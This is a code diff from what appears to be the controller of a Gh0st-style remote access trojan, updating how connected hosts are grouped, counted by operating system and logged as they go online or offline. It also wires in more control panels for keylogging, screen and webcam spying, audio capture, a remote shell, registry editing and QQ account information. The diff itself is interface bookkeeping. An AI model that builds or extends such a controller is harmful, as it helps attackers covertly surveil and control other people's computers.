@@ -189,7 +189,7 @@ void CMySuperGrid::ChangeGroup(CString strGroupName)
 		}
 		ClientContext* pContext = (ClientContext *)pTree->m_lpNodeInfo->MyGetItemDate();
 		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
-		if (strGroupName == LoginInfo->UpGroup)
+		if (strGroupName == pContext->m_group)
 			return;
 		CItemInfo *pItem = CopyData(pTree->m_lpNodeInfo);
 		
@@ -198,7 +198,7 @@ void CMySuperGrid::ChangeGroup(CString strGroupName)
 		UpGroupNum(LoginInfo->UpGroup);
 		
 		//		ClientContext* pNewContext = NULL;// = (ClientContext *)pItem->MyGetItemDate();
-		lstrcpy(LoginInfo->UpGroup, strGroupName);
+		lstrcpy(pContext->m_group, strGroupName);
 		//		AfxMessageBox(pNewContext->m_group);
 		pItem->MySetItemDate((DWORD)pContext);
 		UpGroupNum(strGroupName);
@@ -221,19 +221,19 @@ LRESULT CMySuperGrid::OnAddToList(WPARAM wParam, LPARAM lParam)
 		
 		if (lstrlen(LoginInfo->UpGroup) != NULL)
 		{
-			lstrcpy(LoginInfo->UpGroup, LoginInfo->UpGroup);
+			lstrcpy(pContext->m_group, LoginInfo->UpGroup);
 		}
 		else
 		{
-			lstrcpy(LoginInfo->UpGroup, "Default");
+			lstrcpy(pContext->m_group, "Default");
 			/*		CString Test;
 			Test.Format("%d", GetTickCount());
 			lstrcpy(pContext->m_group, Test);*/
 		}
-		str.Format("(0)%s", LoginInfo->UpGroup);
+		str.Format("(0)%s", pContext->m_group);
 		lp->SetItemText(str);
 		CTreeItem *pRoot = NULL;
-		CTreeItem *pFindRoot = GroupSearch(LoginInfo->UpGroup, NULL);
+		CTreeItem *pFindRoot = GroupSearch(pContext->m_group, NULL);
 		if (pFindRoot != NULL)
 		{
 			if (IsRoot(pFindRoot))
@@ -407,6 +407,7 @@ LRESULT CMySuperGrid::OnAddToList(WPARAM wParam, LPARAM lParam)
 				}
 			}
 		}	
+		lstrcpy(pContext->m_system, pszOS);
 		strOS.Format
 			(
 			"%s SP%d (Build %d)",
@@ -415,6 +416,7 @@ LRESULT CMySuperGrid::OnAddToList(WPARAM wParam, LPARAM lParam)
 			LoginInfo->OsVerInfoEx.dwBuildNumber
 			);
 		lpItemInfo->AddSubItemText(strOS);
+		
 		//CPU
 		str.Format(_T("%d×%.2fGHz"), LoginInfo->nCPUNumber,(float)(LoginInfo->dwCPUClockMhz)/ 1024);
 		lpItemInfo->AddSubItemText(str);
@@ -466,16 +468,16 @@ LRESULT CMySuperGrid::OnAddToList(WPARAM wParam, LPARAM lParam)
 		PlaySound(MAKEINTRESOURCE(IDR_WAVE2),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
 		g_pFrame->m_nUpCount++;
 		
-		//g_pTabView->UpDateNumber();//分组
-		g_pFrame->ShowConnectionsNumber();//统计
-		g_pFrame->ShowOSCount();//统计
-
 		InsertItem(pRoot, lpItemInfo, TRUE);
 		//g_pFrame->UpCount();
 		UpGroupNum(LoginInfo->UpGroup);
-		str.Format("上线 %s		所属分组【%s】", IPAddress, LoginInfo->UpGroup);
+		str.Format("上线 %s		所属分组【%s】", IPAddress, pContext->m_group);
+		g_pLogView->InsertLogItem(str, 0, 1);
 		//g_pLogView->AddToLog(str);
 		lpItemInfo->MySetItemDate((DWORD)pContext);
+
+		g_pFrame->ShowConnectionsNumber();//统计
+		g_pFrame->ShowOSCount();//统计
 		
 	}catch(...){}
 	return 0;
@@ -847,20 +849,24 @@ LRESULT CMySuperGrid::OnReMoveList(WPARAM wParam, LPARAM lParam)
 	{
 	case FILEMANAGER_DLG:
 	case SCREENSPY_DLG:
+	case KEYBOARD_DLG:
 	case WEBCAM_DLG:
 	case AUDIO_DLG:
-	case KEYBOARD_DLG:
-	case SYSTEM_DLG:
 	case SHELL_DLG:
-		/*case PROXY_DLG:
-		case REG_DLG:*/
+	case SYSTEMINFO_DLG:
+	case SYSTEM_DLG:
+	case SERVICE_DLG:
+	case REGEDIT_DLG:
+	case CHAT_DLG:
+	case QQINFO_DLG:
+	case PROXYMAP_DLG:
 		((CDialog*)pContext->m_Dialog[1])->DestroyWindow();
 	default:
 		break;
 	}
 	CString m_IPAddress,str;
 	//	AfxMessageBox(pContext->m_group);
-	CTreeItem *pFindRoot = GroupSearch(LoginInfo->UpGroup, NULL);
+	CTreeItem *pFindRoot = GroupSearch(pContext->m_group, NULL);
 	if (pFindRoot == NULL)
 		return -1;
 	int nCount = NumChildren(pFindRoot);
@@ -892,10 +898,94 @@ LRESULT CMySuperGrid::OnReMoveList(WPARAM wParam, LPARAM lParam)
 			
 		}
 	}
-	UpGroupNum(LoginInfo->UpGroup);
-	str.Format("下线 %s		所属分组【%s】", m_IPAddress, LoginInfo->UpGroup);
-	//g_pLogView->AddToLog(str);
-	//g_pFrame->UpCount();
+
+	//////////////////////////////////////////////////////////////////////////
+	if (pContext->m_system == CString("WinNT"))
+	{
+		g_pFrame->nOSCount[0]--;
+		g_pFrame->nOSCount[11]--;
+	}
+	if (pContext->m_system == CString("Win2000"))
+	{
+		g_pFrame->nOSCount[1]--;
+		g_pFrame->nOSCount[11]--;
+	}
+	if (pContext->m_system == CString("WinXP"))
+	{
+		g_pFrame->nOSCount[2]--;
+		g_pFrame->nOSCount[11]--;
+	}
+	if (pContext->m_system == CString("Win2003"))
+	{
+		g_pFrame->nOSCount[3]--;
+		g_pFrame->nOSCount[11]--;
+	}
+	if (pContext->m_system == CString("WinVista"))
+	{
+		g_pFrame->nOSCount[4]--;
+		g_pFrame->nOSCount[11]--;
+	}
+	if (pContext->m_system == CString("Win2008"))
+	{
+		g_pFrame->nOSCount[5]--;
+		g_pFrame->nOSCount[11]--;
+	}
+	if (pContext->m_system == CString("Win7"))
+	{
+		g_pFrame->nOSCount[6]--;
+		g_pFrame->nOSCount[11]--;
+	}
+	if (pContext->m_system == CString("Win2008R2"))
+	{
+		g_pFrame->nOSCount[5]--;
+		g_pFrame->nOSCount[11]--;
+	}
+
+	if (pContext->m_system == CString("Win8"))
+	{
+		g_pFrame->nOSCount[7]--;
+		g_pFrame->nOSCount[11]--;
+	}
+	if (pContext->m_system == CString("Win2012"))
+	{
+		g_pFrame->nOSCount[8]--;
+		g_pFrame->nOSCount[11]--;
+	}
+	if (pContext->m_system == CString("Win8.1"))
+	{
+		g_pFrame->nOSCount[7]--;
+		g_pFrame->nOSCount[11]--;
+	}
+	if (pContext->m_system == CString("Win2012R2"))
+	{
+		g_pFrame->nOSCount[8]--;
+		g_pFrame->nOSCount[11]--;
+	}
+	if (pContext->m_system == CString("Win10"))
+	{
+		g_pFrame->nOSCount[9]--;
+		g_pFrame->nOSCount[11]--;
+	}
+	if (pContext->m_system == CString("Win2016"))
+	{
+		g_pFrame->nOSCount[10]--;
+		g_pFrame->nOSCount[11]--;
+	}
+	
+		
+	
+	
+	
+	//////////////////////////////////////////////////////////////////////////
+	UpGroupNum(pContext->m_group);
+	str.Format("下线 %s		所属分组【%s】", m_IPAddress, pContext->m_group);
+	g_pLogView->InsertLogItem(str, 0, 1);
+	PlaySound(MAKEINTRESOURCE(IDR_WAVE1),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
+
+	// 更新当前连接总数
+	g_pFrame->ShowOSCount();//统计
+	g_pFrame->ShowConnectionsNumber();
+	
 	
 	return 0;
 }
@@ -1825,13 +1915,17 @@ void CMySuperGrid::DisConnect()
 		{
 		case FILEMANAGER_DLG:
 		case SCREENSPY_DLG:
+		case KEYBOARD_DLG:
 		case WEBCAM_DLG:
 		case AUDIO_DLG:
-		case KEYBOARD_DLG:
-		case SYSTEM_DLG:
 		case SHELL_DLG:
-		//case PROXY_DLG:
-		//case REG_DLG:
+		case SYSTEMINFO_DLG:
+		case SYSTEM_DLG:
+		case SERVICE_DLG:
+		case REGEDIT_DLG:
+		case CHAT_DLG:
+		case QQINFO_DLG:
+		case PROXYMAP_DLG:
 			((CDialog*)pContext->m_Dialog[1])->DestroyWindow();
 		default:
 			break;
